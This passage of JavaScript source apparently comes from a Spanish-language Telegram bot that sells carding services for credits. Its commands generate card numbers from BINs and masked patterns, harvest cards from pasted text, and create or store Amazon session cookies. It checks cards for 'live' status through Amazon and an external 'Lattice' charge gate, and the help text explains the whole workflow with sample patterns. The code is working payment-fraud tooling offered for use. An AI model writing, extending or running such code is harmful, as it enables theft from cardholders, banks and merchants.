        return sendSafeMessage(chatId, '📅 Envía @usuario|id y la cantidad de días (ej. @usuario 15):');
    }

    try {
        const user = await findUserByUsernameOrId(target, role);
        await callApiWithBotKey(`/admin/users/${user.id}/days`, 'PUT', { days: parseInt(days), reason: 'Ajuste por bot' });
        await sendSafeMessage(chatId, `✅ Se establecieron ${days} días para ${user.username}.`);
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(requesterId);
});

bot.onText(/^[\/\.](?:binlist|bins|list|binl|bnl)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let query = match[1];
    if (!query && msg.reply_to_message && msg.reply_to_message.text) {
        query = msg.reply_to_message.text.trim();
    }
    if (!query) {
        setUserState(telegramId, { step: 'awaiting_binlist_query' });
        return sendSafeMessage(chatId, '🏦 Ingresa el nombre de un banco o país:');
    }
    await handleBinlistCommand(chatId, telegramId, query);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:extrapolador|extrapolado|extrapolad|extrapolar|extrapola|extrapol|extrapo|extrap|extras|extra|expo|exp|ext|xtr|xtrp|scrapper|scrapp|scrp)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let input = args[0];
    if (!input && msg.reply_to_message && msg.reply_to_message.text) {
        input = msg.reply_to_message.text.trim();
    }
    if (!input) {
        setUserState(telegramId, { step: 'awaiting_extrapolador_input' });
        return sendSafeMessage(chatId, '🔢 Envía un BIN de 6 dígitos, nombre de banco o país:');
    }
    await handleExtrapoladorCommand(chatId, telegramId, input);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:generadorccs|genccs|gncc|gen\b)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let param = args[0];
    if (!param && msg.reply_to_message && msg.reply_to_message.text) {
        param = msg.reply_to_message.text.trim();
    }
    if (!param) {
        setUserState(telegramId, { step: 'awaiting_gen_param' });
        return sendSafeMessage(chatId, '🎴 Envía un extra, BIN o nombre de banco:');
    }
    await handleGenCommand(chatId, telegramId, param);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:setcookie|setcuki|stck|sck|setck|addcookie|addcuki|addck|dck|ack)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let cookie = args[0];
    if (!cookie && msg.reply_to_message && msg.reply_to_message.text) {
        cookie = msg.reply_to_message.text.trim();
    }
    if (!cookie) {
        setUserState(telegramId, { step: 'awaiting_setcookie' });
        return sendSafeMessage(chatId, '🍪 Envía la cookie:');
    }
    await handleSetCookieCommand(chatId, telegramId, cookie);
    clearUserState(telegramId);
});

bot.onText(/^[\/\.](?:lattice)(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let amount = args[0];
    if (!amount && msg.reply_to_message && msg.reply_to_message.text) {
        amount = msg.reply_to_message.text.trim();
    }
    if (!amount) {
        setUserState(telegramId, { step: 'awaiting_lattice_amount' });
        return sendSafeMessage(chatId, '💰 Ingresa el monto (ej. 19.99):');
    }
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 1)) return;
    setUserState(telegramId, { step: 'awaiting_lattice_cards', data: { amount } });
    await sendSafeMessage(chatId, '💳 Envía las tarjetas (texto sucio o patrón):');
});

bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1] ? match[1].trim().split(/\s+/) : [];
    let texto = args[0];
    if (!texto && msg.reply_to_message && msg.reply_to_message.text) {
        texto = msg.reply_to_message.text.trim();
    }
    if (!texto) {
        setUserState(msg.from.id, { step: 'awaiting_limpiador' });
        return sendSafeMessage(chatId, '📝 Envía el texto sucio:');
    }
    await handleLimpiadorCommand(chatId, msg.from.id, texto);
    clearUserState(msg.from.id);
});

bot.onText(/\/creditos|\/credits|\/saldo/, async (msg) => {
    const user = await getUserByTelegramId(msg.from.id);
    if (!user) return sendSafeMessage(msg.chat.id, '❌ Usa /start.');
    await sendSafeMessage(msg.chat.id, `💰 Créditos: ${user.credits}\n📅 Días: ${user.days_remaining}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/menu/, async (msg) => {
    const opts = { reply_markup: { inline_keyboard: [
        [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
        [{ text: '🔍 Extrapolador', callback_data: 'menu_extrapolador' }],
        [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
        [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
        [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
        [{ text: '💰 Créditos', callback_data: 'menu_creditos' }]
    ] } };
    await sendSafeMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.onText(/\/help/, async (msg) => {
    await sendSafeMessage(msg.chat.id,
        `📖 *COMANDOS DISPONIBLES*\n\n` +
        `🔹 *Gestión de cuenta*\n` +
        `/start - Vincular tu cuenta de Telegram\n` +
        `/creditos - Ver tus créditos y días restantes\n` +
        `/menu - Mostrar menú interactivo\n\n` +
        
        `🔹 *Generación de cookies*\n` +
        `/gencookie [país] - Genera cookie (4 créditos)\n` +
        `   País: MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN\n` +
        `/setcookie [cookie] - Guarda una cookie manualmente\n\n` +
        
        `🔹 *Búsqueda y extrapolación*\n` +
        `/binlist [banco|país] - Lista bins de un banco o país\n` +
        `/extrapolador [banco|país|bin] - Extrae patrones desde un BIN o banco (10 créditos)\n\n` +
        
        `🔹 *Verificación en Amazon*\n` +
        `/amazon [banco|país|bin|extra|tarjetas] - Verifica tarjetas con la cookie guardada\n` +
        `/amazoncookie [banco|país|bin|extra|tarjetas] - Genera cookie nueva y verifica (4 créditos)\n\n` +

        `🔹 *Otras herramientas*\n` +
        `/gen [banco|país|bin|extra] - Genera tarjetas desde un patrón, BIN o banco (4 créditos)\n` +
        `   Ejemplo: /gen 481515310022xxxx|09|2029|rnd 20\n` +
        `/limpiador - Extrae tarjetas de texto sucio\n` +
        `/bin [6-digit-bin] - Consulta información del BIN (banco, marca, tipo, nivel, país)\n` +
        `   Ejemplo: /bin 549949\n` +
        `/lattice [monto] - Gate charged (1 crédito por dead o live)\n\n` +
        
        `📌 *Formatos aceptados:*\n` +
        `• Extra: 16 dígitos con X (ej. 481515310022xxxx|09|2029|rnd)\n` +
        `• BIN: 6 dígitos (ej. 481515)\n` +
        `• Banco: nombre (ej. banorte, bbva, bancoppel)\n` +
        `• Tarjetas: lista en líneas separadas (16|MM|AAAA|CVV)\n\n` +
        
        `💡 *Uso interactivo:*\n` +
        `Si escribes un comando sin parámetros, el bot te pedirá los datos.\n` +
        `También puedes responder a un mensaje anterior con el comando.\n` +
        `Tienes 5 minutos para responder.`,
        { parse_mode: 'Markdown' }
    );
});

// ========== NUEVO COMANDO /bin ==========
bot.onText(/^[\/\.](?:bin)(?:\s+(\d{6}))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let bin = match[1];
    if (!bin && msg.reply_to_message && msg.reply_to_message.text) {
        const texto = msg.reply_to_message.text.trim();
        const posibleBin = texto.match(/\b\d{6}\b/);
        if (posibleBin) bin = posibleBin[0];
    }
    if (!bin) {
        setUserState(telegramId, { step: 'awaiting_bin_input' });
        return sendSafeMessage(chatId, '💳 Envía un BIN de 6 dígitos para obtener su información:');
    }
    if (!/^\d{6}$/.test(bin)) {
        return sendSafeMessage(chatId, '❌ BIN inválido. Debe tener exactamente 6 dígitos.');
    }
    await sendSafeMessage(chatId, `🔍 Consultando información del BIN ${bin} en múltiples fuentes...`);
    try {
        const info = await getBinInfo(bin);
        if (!info) {
            return sendSafeMessage(chatId, `❌ No se pudo obtener información para el BIN ${bin}.`);
        }
        const emojiPais = info.countryCode ? ` 🇲🇽` : '';
        const mensaje = `💳 *Información del BIN: ${info.bin}*\n\n` +
                        `🏛 *Banco:* ${info.bank}\n` +
                        `🏢 *Marca:* ${info.brand}\n` +
                        `🏷 *Tipo:* ${info.type}\n` +
                        `👑 *Nivel:* ${info.level}\n` +
                        `🌎 *País:* ${info.country}${emojiPais} (${info.countryCode || '??'})`;
        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
    } catch (err) {
        await sendSafeMessage(chatId, `❌ Error al consultar el BIN: ${err.message}`);
    }
    clearUserState(telegramId);
});

// ========== MANEJO DE RESPUESTAS INTERACTIVAS ==========
bot.on('message', async (msg) => {
    const telegramId = msg.from.id;
    const state = userStates.get(telegramId);
    if (!state || !state.step) return;
    if (msg.text?.startsWith('/')) return;
    const userText = msg.text;
    const chatId = msg.chat.id;
    switch (state.step) {
        case 'awaiting_binlist_query':
            await handleBinlistCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_extrapolador_input':
            await handleExtrapoladorCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_gen_param':
            await handleGenCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_gencookie_country':
            await handleGenCookieCommand(chatId, telegramId, userText.toUpperCase());
            break;
        case 'awaiting_setcookie':
            await handleSetCookieCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_amazon_cards':
            await handleAmazonCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_info_target':
            bot.emit('text', { ...msg, text: `/info ${userText}` });
            break;
        case 'awaiting_setcredits': {
            const parts = userText.split(/\s+/);
            if (parts.length >= 2) {
                bot.emit('text', { ...msg, text: `/setcredits ${parts[0]} ${parts[1]}` });
            } else {
                await sendSafeMessage(chatId, '❌ Formato incorrecto. Usa: @usuario cantidad');
            }
            break;
        }
        case 'awaiting_setdays': {
            const parts = userText.split(/\s+/);
            if (parts.length >= 2) {
                bot.emit('text', { ...msg, text: `/setdays ${parts[0]} ${parts[1]}` });
            } else {
                await sendSafeMessage(chatId, '❌ Formato incorrecto. Usa: @usuario días');
            }
            break;
        }
        case 'awaiting_setplan_20':
        case 'awaiting_setplan_60':
        case 'awaiting_setplan_120':
        case 'awaiting_setplan_200': {
            const plan = state.step.split('_')[2];
            bot.emit('text', { ...msg, text: `/setplan${plan} ${userText}` });
            break;
        }
        case 'awaiting_setadmin':
            bot.emit('text', { ...msg, text: `/setadmin ${userText}` });
            break;
        case 'awaiting_setseller':
            bot.emit('text', { ...msg, text: `/setseller ${userText}` });
            break;
        case 'awaiting_setuser':
            bot.emit('text', { ...msg, text: `/setuser ${userText}` });
            break;
        case 'awaiting_ban':
            bot.emit('text', { ...msg, text: `/ban ${userText}` });
            break;
        case 'awaiting_unban':
            bot.emit('text', { ...msg, text: `/unban ${userText}` });
            break;
        
        case 'awaiting_lattice_amount':
            setUserState(telegramId, { step: 'awaiting_lattice_cards', data: { amount: userText } });
            await sendSafeMessage(chatId, '💳 Envía las tarjetas (texto sucio o patrón):');
            break;
        case 'awaiting_lattice_cards': {
            const amount = state.data.amount;
            const tarjetas = limpiarTarjetas(userText);
            if (tarjetas.length === 0) {
                await sendSafeMessage(chatId, '❌ No se encontraron tarjetas válidas.');
                break;
            }
            await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas con Lattice ($${amount})...`);
            try {
                const resultados = [];
                for (const card of tarjetas.slice(0, 10)) {
                    const resp = await fetch(API_LATTICE_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ card, amount }) });
                    const data = await resp.json();
                    resultados.push({ card, status: data.status });
                }
                const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
                let resumen = `${separador}\n`;
                for (const r of resultados) resumen += `• Card: ${r.card}\n• Status: ${r.status}\n${separador}\n`;
                await sendSafeMessage(chatId, resumen);
                await deductCredits(telegramId, 1);
            } catch (err) {
                await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
            }
            break;
        }
        case 'awaiting_limpiador':
            await handleLimpiadorCommand(chatId, telegramId, userText);
            break;
        case 'awaiting_bin_input':
            if (/^\d{6}$/.test(userText)) {
                bot.emit('text', { ...msg, text: `/bin ${userText}` });
            } else {
                await sendSafeMessage(chatId, '❌ Debes enviar exactamente 6 dígitos para el BIN.');
            }
            break;
        default:
            break;
    }
    clearUserState(telegramId);
});

// ========== CALLBACK QUERY ==========
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const telegramId = callbackQuery.from.id;
    const data = callbackQuery.data;
    if (data === 'gencookie_for_amazon') {
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true }) });
            const json = await response.json();
            if (!json.success) throw new Error('Error');
            const cookie = json.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult?.newCredits || '?'}\nAhora envía las tarjetas:`);
            setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
        await bot.answerCallbackQuery(callbackQuery.id);
    } else {
        let respuesta = '';
        switch(data) {
            case 'menu_gencookie': respuesta = 'Usa /gencookie MX (o US...). Cuesta 4 créditos.'; break;
            case 'menu_extrapolador': respuesta = 'Usa /extrapolador 123456 (10 créditos)'; break;
            case 'menu_gen': respuesta = 'Usa /gen 549949056298xxxx|05|2029'; break;
            case 'menu_limpiador': respuesta = 'Usa /limpiador y luego envía el texto'; break;
            case 'menu_chk': respuesta = 'Usa /amazon [tarjetas|patrón|BIN|banco]'; break;
            case 'menu_creditos': respuesta = 'Usa /creditos'; break;
            default: respuesta = 'Opción no válida.';
        }
        await sendSafeMessage(chatId, respuesta, { parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id);
    }
});

console.log('✅ Bot mejorado listo y funcionando');